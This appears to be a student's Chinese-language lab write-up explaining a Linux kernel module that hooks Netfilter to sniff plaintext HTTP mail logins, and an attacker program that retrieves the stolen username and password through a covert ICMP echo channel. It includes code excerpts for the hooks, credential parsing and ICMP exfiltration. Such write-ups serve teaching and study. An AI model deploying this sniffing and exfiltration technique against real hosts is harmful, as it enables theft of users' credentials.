### 窃取用户名和密码的流程

#### 一、受害者主机

- 代码文件：nfsniff.c文件；**这是一种内核代码。**

- 编写Makefile文件对源文件进行编译，生成.ko文件，需要将.ko文件动态加载到受害者的内核。

  `sudo insmod nfsniff.ko`

- 内核代码中没有main函数，必须且主要执行的为`init_module()`方法和`cleanup_module()`方法，顾名思义，初始化方法首先被执行，功能完成后执行清除方法，进行空间释放、取消注册等操作。

- 那么来看一下攻击者编写nfsniff.c文件放入受害者内核的目的是什么吧，其主要做了哪些操作？

  1. 定义两个nf_hook_ops结构体类型(linux/netfilter.h头文件定义)`pre_hook`和`post_hook`，可以理解为对传入数据包进行处理的钩子和对传出数据包进行处理的钩子。

     `pre_hook`的`hook`函数指针指向`watch_in()`函数，并将其与`NF_INET_PRE_ROUTING`绑定，目的在于只要受害者主机接收到数据包进行处理时就执行`watch_in()`函数，进行监控和一些其它操作。绑定代码如下：

     ```c
     /*hook函数指针指向watc_in*/ 
        pre_hook.hook     = watch_in;
        /*协议簇为ipv4*/  
        pre_hook.pf       = PF_INET;
        /*优先级最高*/
        pre_hook.priority = NF_IP_PRI_FIRST;
        /*hook的类型为 在完整性校验之后，选路确定之前*/ 
        pre_hook.hooknum  = NF_INET_PRE_ROUTING;  //PRE_ROUTING绑定watch_in函数，构成了一个pre_hook结构体；其绑定其它函数形成其它结构体，这里要设置该结构体优先级最高
     ```

     `post_hook`的`hook`函数指针指向`watch_out()`函数，并将其与`NF_INET_POST_ROUTING`绑定，目的在于只要受害者主机发送数据包时就执行`watch_out()`函数，进行监控和一些其它操作。绑定代码如下：

     ```c
     /*hook函数指针指向watch_out*/ 
        post_hook.hook     = watch_out;
        /*协议簇为ipv4*/  
        post_hook.pf       = PF_INET;
        /*优先级最高*/
        post_hook.priority = NF_IP_PRI_FIRST;
        /*hook的类型为 在完数据包离开本地主机“上线”之前*/ 
        post_hook.hooknum  = NF_INET_POST_ROUTING;
     ```

     最后要将自己定义的`pre_hook`和`post_hook`结构注册进去。

     - 对于**Netfilter**的学习，老师的专栏中有讲，这里引入一下概念定义：

       > Netfilter是从Linux 2.4开始引入内核的一个子系统，架构就是在整个网络流程的若干位置放置了一些检测点（HOOK），而在每个检测点（比如上边的PRE_ROUTING和POST_ROUTING）上登记了一些处理函数进行处理（如包过滤，NAT等，以及可以是用户自定义的功能）。

       Netfilter工作位置（IP层）如下图：

       ![img](https://pic2.zhimg.com/80/v2-36a0ed3c59f9bbbd346280922fd36ed5_hd.jpg)

        Netfilter在IP层有五个hook点，功能分配如下：

       ```
       NF_IP_PRE_ROUTING：刚刚进入网络层的数据包通过此点（刚刚进行完版本号，校验和等检测），                    目的地址转换在此点进行；
       NF_IP_LOCAL_IN：经路由查找后，送往本机的通过此检查点，INPUT包过滤在此点进行；
       NF_IP_FORWARD：要转发的包通过此检测点，FORWORD包过滤在此点进行；
       NF_IP_POST_ROUTING：所有马上便要通过网络设备出去的包通过此检测点，内置的源地址转换功能                   （包括地址伪装）在此点进行；
       NF_IP_LOCAL_OUT：本机进程发出的包通过此检测点，OUTPUT包过滤在此点进行。
       ```

       **我们这里主要在NF_IP_PRE_ROUTING和NF_IP_POST_ROUTING这两个hook点编写处理函数，**即可达到窃取用户名和密码的功能。

       五个hook点的处理位置和流程如下图：

       ![preview](https://pic1.zhimg.com/v2-ec028ac858c3550055281370d68001b8_r.jpg)

       Netfilter的返回码如下（在处理函数中针对不同的条件执行不同的操作）：

       ```
       NF_DROP           丢弃数据包
       NF_ACCEPT         保留数据包
       NF_STOLEN         忘记数据包
       NF_QUEUE          用户空间的队列数据包。
       NF_REPEAT         再次调用此钩子函数。
       ```

       

  2. 下面我们来分别看看绑定在NF_IP_POST_ROUTING和NF_IP_PRE_ROUTING检测点的两个处理函数，这是窃取用户名和密码的关键之一。

     - `watch_out()`函数

       （1）**数据包分析**

       > 当受害者打开邮箱网站（明文传输），输入用户名和密码登录时，实际上发送的是HTTP请求，请求方式为POST方式（即用户名和密码字符串的值放在请求的数据部分中传送），请求访问的服务器为邮箱服务器，其有一个专门的IP地址，并开放80端口进行接收。
       >
       > HTTP请求使用的传输层协议为TCP协议。

       以科大邮箱为例，输入用户名和密码后使用wireshark进行抓包，提取出协议为HTTP的包。**注意这里一定要选对使用的网卡，我连的是无线网所以需要在cmd中用ipconfig命令查看无线网的网卡是什么。**抓到的包如下：

       ![wireshark抓http包1](assets\wireshark抓http包1.jpg)

       我们打开看一下HTTP请求中的具体内容，**找到用户名和密码所在的位置：**

       ![wireshark抓http包2](assets\wireshark抓http包2.jpg)

       **注意中间标记的一行，Cookie中也保存有受害者输入的用户名uid，而我们要获取的是数据部分填写的uid和password，那么我们针对请求数据包获取数据时，应从Cookie后面的地址开始获取。**

       下面是我们尝试了cookie后面的不同字符串获取到的结果：

       ![试验不同的用户名和密码查找位置](assets\试验不同的用户名和密码查找位置.png)

       再来看一下实际传送的数据包中的数据是如何表示的：

       ![wireshark抓http包3](assets\wireshark抓http包3.jpg)

       可以看到真正的数据部分包含了很多数据，这里我们只需要获取`uid`和`password`即可，**注意到这里还有&符号，我们可以利用它找到结束位置，获取字符串长度。**

       （2）**代码分析**

       复制一份数据包所在地址的指针（sk_buff类型），因为HTTP请求使用传输层的TCP协议，所以不是TCP协议的都直接ACCEPT，意为这不是我们需要处理的包。

       过滤出需要处理的请求包后，获取tcp报文的数据部分，即含有IP和HTTP请求的信息，跳过IP首部，到达IP的数据部分，这里要判断其是否为HTTP请求包，判断方式为检查其目的端口是否为80端口，不是的同样直接ACCEPT。

       接下来留下的都是受害者向邮箱服务器发送请求的包，这里判断一下如果还未获取到用户名和密码对，就调用`check_http(sb)`函数进行获取。

     

     - `check_http(struct sk_buff *skb)`函数

       （1）首先获取TCP头部地址，然后跳过TCP头部，达到数据部分（保存到data中），数据部分即为HTTP请求的内容。

       ```c
        /* 系统位数导致强制类型转换错误 64位系统中指针类型8个字节，因此强转为int会出错，可以转成同样为8字节的long型 */ 
          /*tcp->doff为TCP报文中的偏移字段，指示TCP的头部长度，单位为4字节*/
          /*在网站上输入用户名和密码登录邮箱属于HTTP请求，其在传输层由TCP协议单元来封装，所以要获取保存用户名和密码的请求数据需要定位到TCP的数据部分*/
          /* -----sk_buff结构体定义的变量为unsigned long类型*/
          data = (char *)((unsigned long)tcp + (unsigned long)(tcp->doff * 4));
       ```

       （2）上边我们讲要从Cookie后面的地址开始获取，所以要选择一个中间的唯一的字符串，先获取到其所在的位置，然后在该位置处找首次出现`uid=`的地址，向后移动4个字节（uid=四个字符，每个字符占一个字节）为用户名字符串真正的开始位置，然后找到第一个“&”符号出现的位置，两位置相减为用户名字符串的长度，然后根据长度**在内核中**给用户名分配内存（username指示）并初始化。**注意这里大小为len+2，因为还需要结束符/0，并留一个空格（和密码区分开）。**最后，将请求包中截取的`uid`复制到username指向的内存区域，最后添加结束符。

       获取密码的方式同理。

       （3）**注意受害者通过HTTP请求访问的服务器都有自己特定的唯一的IP地址，这里是邮箱服务器，我们要知道邮箱服务器的IP地址是什么，才能对应上相应的用户名和密码。**

       所以我们要在TCP报文中提取IP头部，从头部中获取目的IP地址，就是服务器的地址；并在TCP首部中获取邮箱服务器的端口号。

       ```c
         /*获取32位目的ip，从ip首部的daddr字段中获取*/
          /*target_ip是邮箱服务器的IP，对应用户名和密码*/   
          if (!target_ip)
            target_ip = ip_hdr(skb)->daddr;
          /*获取16位源端口号，从tcp首部的source中获取*/ 
          /*获取访问的邮箱服务器的端口号*/
          if (!target_port)
            target_port = tcp->source;
       ```

       用户名和密码都获取到之后，将`have_pair`的值变为1，并输出用户名和密码。

     - `watch_in()`函数

       （1）**功能分析**

       主机的内核，在受害者访问邮箱发出请求时调用`watch_in()`函数获取到了用户名和密码，并保存在了内核内存中，那么这个数据如何传递给攻击者呢？

       此时就需要监听外部传入给受害者的数据包，**攻击者会构造一个`ICMP_ECHO`包发送给受害者，双方协定一个暗号（实际上是一个数值），表示攻击者要来取用户名和密码数据了，攻击者将暗号设置为ICMP包的code字段的值。受害者对于传入的数据包进行过滤，提取出攻击者发来的收回数据为目的的数据包，把数据返回给攻击者。**

       **注意，受害者收到ICMP请求数据包后，并不是重新构建一个ICMP回复数据包，而是在该包的基础上进行修改，把数据填充到数据部分，并交换IP的目的地址和源地址等。最后设置该包为需要转发出去的包类型。**

       ```c
       /*将ip首部中的源地址和目的地址互换——因为对攻击者的ICMP包进行修改后转发*/
          /*32位源IP地址暂时存在taddr中*/ 
          taddr = ip_hdr(sb)->saddr; 
          ip_hdr(sb)->saddr = ip_hdr(sb)->daddr;
          ip_hdr(sb)->daddr = taddr;
       ```

       ```c
        sb->pkt_type = PACKET_OUTGOING;   //设置转发出去的类型，把接收到并修改的包类型设                                      置为转发出去的包
       ```

       

       （2）**代码分析**

       Netfilter对数据包进行过滤，过滤掉所有非ICMP包，然后找到ICMP首部的地址，然后对ICMP首部中的内容进行判断，查看其`code`字段是否含有暗号，且ICMP包的类型是否为ECHO包（type为8），**且要看ICMP请求包的数据部分的大小是否大于等于要回复的数据长度，这是为了防止误发。**

       **这里要回复的数据长度为36字节。**为什么是36字节呢？我们先看看要回复的数据：**服务器的IP地址，用户名和密码。**这里用户名和密码的长度都是规定的16字节（在后边复制时有出现）。所以为**4+16+16=36字节。**

       根据服务器IP地址的长度，用户名的长度和密码的长度，将数据复制到ICMP包的数据部分（cp_data指示）。

       ```c
        /* 现在将邮箱服务器的IP地址，然后用户名，然后密码复制到数据包*/
          /*cp_data指向数据部分，这里是跳过icmp首部*/ 
          cp_data = (char *)((char *)icmp + sizeof(struct icmphdr));
          /*将目标服务器的ip地址放到数据区域*/ 
          memcpy(cp_data, &target_ip, 4);  //IP地址为4字节
          
          /*将用户名和密码放到cp_data中*/ 
          if (username)
            /*跳过上面用掉的4字节*/ 
            memcpy(cp_data + 4, username, 16);
          if (password)
            /*跳过上面用掉的20字节*/ 
            memcpy(cp_data + 20, password, 16);
       ```

       最后释放相应的内存空间，并将变量置0。

       `NF_STOLEN`表示：受害者向攻击者发送用户名和密码的数据包实际上是在攻击者发过来的报文中修改的，修改后需要告诉系统忘记原有的那个skb，因为skb被修改，并以新的方式发送出去了。

       

#### 二、攻击者主机

* 代码文件：getpass.c文件；普通C文件。

* **代码分析：**

  （1）这里需要分配两个空间，一个是存放构造的ICMP_ECHO数据包的空间，一个是存放接收到的受害者回复的信息的空间；两者都需要初始化。

  ```c
      /*攻击者需要构造ICMP包，给其分配一定的空间*/
      unsigned char dgram[256];          /* Plenty for a PING datagram */
      /* 接收受害者传过来的回复ICMP包的buff(含用户名和密码)*/ 
      unsigned char recvbuff[256]; 
  ```

  （2）攻击者需要自己构造ICMP包，这里就用到了实验一的知识。

  这里先说明一下**sockaddr_in**结构体类型和**in_addr**结构体类型。

  ```c
  struct  sockaddr_in {
  	short  int  sin_family;               /* Address family */
  	unsigned  short  int  sin_port;       /* Port number */
  	struct  in_addr  sin_addr;            /* Internet address */
  	unsigned  char  sin_zero[8];          /* Same size as struct sockaddr */
  };
  ```

  可以看到`sockaddr_in`中不仅有IP地址，还有一些像协议族之类的信息，如果要取IP地址，需要用`结构体变量.sin_addr`。

  ```c
  struct  in_addr {
  	unsigned  long  s_addr;
  };
  ```

  而`in_addr`中仅含IP地址。

  构造包时定义了四个地址类型，其中受害者的IP和攻击者的IP都是在运行代码时需要用户手动输入的，如下代码解释：

  ```c
      /* 源地址：不仅有攻击者的IP地址 */
      struct sockaddr_in src;
      /* 目的地址：包含受害者的IP；这里IP地址需要接收命令行输入的第一个参数*/
      struct sockaddr_in addr;
      /* in_addr是sockaddr_in中的一部分，其中仅含IP地址变量；sockaddr_in*/
      struct in_addr my_addr;  //仅是攻击者IP地址；这里需要接收命令行输入的第二个参数
      /* 仅含受害者访问的邮箱服务器的地址*/
      struct in_addr serv_addr;
  ```

  计算`sockaddr_in`类型结构体的大小。

  （3）构造IP头部数据。

  **注意这里要定义IP包的总长度，要把ICMP的数据部分的大小设置为至少36字节，防止被受害者过滤掉。**所以IP包的总长度为**>=64：20字节IP头部+8字节ICMP头部+36字节数据部分大小。**这里设置为84字节。

  ```c
  iphead->ip_len = 84;
  ```

  （4）构造ICMP头部数据。

  **注意这里要将type字段设置为ICMP_ECHO，将code字段设置为0x5B。0x5B就是攻击者和受害者协商的暗号。**

  ICMP的校验和需要计算头部和数据部分，这里为**8+36=44字节**。

  ```c
  icmphead->icmp_cksum = checksum(44, (unsigned short *)icmphead);
  ```

  （5）构造套接字进行发包和收包。

  ```c
  sendto(icmp_sock, dgram, 84, 0, (struct sockaddr *)&addr, sizeof(struct sockaddr)
  ```

  ```c
  recvfrom(icmp_sock, recvbuff, 256, 0, (struct sockaddr *)&src, &src_addr_size) < 0)
  ```

  （6）对回复的数据包进行处理，取出服务器IP，用户名和密码数据。

  取得IP头部，跳20字节得到ICMP头部，跳8字节到达ICMP数据部分，**数据部分的前4个字节是服务器的IP地址，将其复制到前边定义的in_addr    serv_addr中。**

  ```c
  memcpy(&serv_addr, ((char *)icmphead + 8), sizeof (struct in_addr)); 
  ```

  将取得服务器IP地址（结构体字符串形式）转换成“.”间隔的IP地址形式**[使用`inet_ntoa()`函数]**并输出。

  ICMP头部跳12字节**（8字节ICMP头部+4字节IP地址）**为用户名数据的初始位置。

  ```c
  fprintf(stdout, "Username:    %s\n", (char *)((char *)icmphead + 12));
  ```

  ICMP头部跳28字节**（8字节ICMP头部+4字节IP地址+16字节用户名字符串）**为密码数据的初始位置。

  ```c
  fprintf(stdout, "Password:    %s\n", (char *)((char *)icmphead + 28));
  ```

  

#### 三、实验步骤

最后说一下简单的实验步骤：

![实验步骤](assets\实验步骤.jpg)